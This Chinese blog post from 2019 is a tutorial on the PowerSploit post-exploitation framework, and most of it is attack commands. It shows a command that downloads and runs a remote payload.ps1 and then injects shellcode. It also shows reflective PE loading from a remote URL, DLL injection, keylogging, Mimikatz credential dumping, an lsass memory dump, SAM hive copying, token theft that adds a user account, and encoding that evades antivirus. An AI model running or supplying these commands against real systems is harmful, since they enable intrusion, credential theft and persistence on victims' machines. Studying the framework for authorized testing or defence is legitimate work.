---
title: "后渗透框架 PowerSploit"
date: 2019-07-25T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['powershell']
categories: ['内网渗透']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


PowerSploit 是基于 PowerShell 的后渗透框架. 在功能上分为杀软绕过, 命令执行, 特权提升, 权限维持, 信息收集等模块及一些辅助性脚本.

限于篇幅, 仅针对常用脚本进行说明.

<!--more-->

### PowerShell

PowerShell 是微软旨在替代 vbs 而开发的基于 .Net Framework 的命令行程序和脚本环境, 其强大的特性而被经常用于后渗透信息收集, 横向移动, 权限维持等.

Powershell 目前有 6 个版本, 其中 Windows 7/2008 R2 内置 Powershell 2.0, Windows 8/8.1/2012 R2 内置 PowerShell 3.0, Windows 10 1903 内置 PowerShell 5.0.

在 PowerShell 中, 一切皆为对象, 且命令一致采用 "动词-名词" 的格式, 如 `Set-Content`, `Get-Item`. PowerShell 的另一大好处为它拥有丰富的文档信息, 包括第三方脚本, 都可以采用 `Get-Help Command` 的方式查询帮助, 或加上 `-examples` 参数查看示例.

PowerShell 默认采用 Restricted 的执行策略, 即不允许所有脚本执行, 另有 AllSigned, RemoteSigned, Bypass, Unrestricted 策略, 使用 `Set-ExecutionPolicy` 更改策略, 其它绕过执行策略的方式在此不再赘述.

Powershell 因为其强大的特性, 如对 WinAPI 的支持, 大部分操作完全可以利用 PowerShell 来完成, 且为脚本语言, 无需编译, 达到了真正的无文件落地, 内存执行, 从而绕过了杀软的静态检测.

## PowerSploit

PowerSploit 是基于 PowerShell 的后渗透框架. 在功能上分为杀软绕过, 命令执行, 特权提升, 权限维持, 信息收集等模块及一些辅助性脚本.

限于篇幅, 仅针对常用脚本进行说明.

### CodeExecution

命令执行.

**Invoke-DllInjection**

向指定进程注入 DLL.

```
Invoke-DllInjection -ProcessID 1234 -Dll .\payload.dll
```

**Invoke-Shellcode**

向指定进程注入 Shellcode.

```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/payload.ps1')
Invoke-Shellcode -ProcessID 1234 -Shellcode $buf
```

**Invoke-ReflectivePEInjection**

反射型 DLL/PE 注入. 可从网络加载 DLL/PE 文件.

```
Invoke-ReflectivePEInjection -PEUrl http://192.168.1.100/payload.exe -Force
```

### Privesc

特权提升.

**PowerUp**

检查可用的提权方法.

```
Invoke-AllChecks
```

### Exfiltration

针对本机的信息收集.

**Get-GPPPassword**

导出组策略中配置的用户名和密码 (GPP 漏洞).

```
GET-GPPPassword
```

**Get-Keystrokes**

键盘记录.

```
Get-Keystrokes -LogPath .\keylog.txt
```

**Get-TimedScreenshot**

定时截图.

```
Get-TimedScreenshoft -Path .\ -Interval 10
```

**Get-VaultCredential**

导出 Windows 凭据.

```
Get-VaultCredential
```

**Invoke-Mimikatz**

Mimikatz 的 PowerShell 版本.

```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

**Invoke-NinjaCopy**

强行复制被进程占用的文件.

```
Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\SAM
```

**Invoke-TokenManipulation**

窃取凭据. 实际测试只能通过 CreateProcess 的方式以 SYSTEM 权限执行命令.

```
Invoke-TokenManipulation -UserName "NT AUTHORITY\SYSTEM" -CreateProcess cmd.exe -ProcessArgs "net user test test /add"
```

**Out-Minidump**

procdump 的 PowerShell 版本.

```
Get-Process lsass | Out-Minidump
```

**VolumeShadowCopyTools**

ShadowCopy 的 PowerShell 版本.

```
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy
Mount VolumeShadowCopy -Path .\ -DevicePath \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
copy .\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .\
Remove-VolumeShadowCopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

### Recon

针对内网的信息收集.

**Get-ComputerDetail**

获取日志信息, 如 RDP 日志, 事件日志.

```
Get-ComputerDetail
```

**Get-HttpStatus**

目录扫描.

```
Get-HttpStatus -Target 192.168.1.1 -Port 8080 -Path .\admin.txt
```

**Invoke-Portscan**

端口扫描.

```
Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -TopPorts 50
```

**Invoke-ReverseDnsLookup**

内网 IP 反查主机名.

```
Invoke-ReverseDnsLookup '192.168.1.0/24,10.0.0.1'
```

**PowerView**

域渗透信息收集框架 [PowerView](https://exp10it.cn/powerview-domain-recon.html).

### ScriptModification

脚本更改.

**Out-CompressdDLL**

将 DLL 编码为可在 PowerShell 中调用的格式.
```
Out-CompressdDLL -FilePath .\payload.dll
```

**Out-EncodedCommand**

将 PowerShell 命令或文件编码为 base64 格式.

```
Out-EncodedCommand -ScriptBlock {"whoami"}
Out-EncodedCommand -Path .\payload.ps1
```

**Remove-Comment**

去除脚本中的空格和注释.

```
Remove-Comment -Path .\payload.ps1
```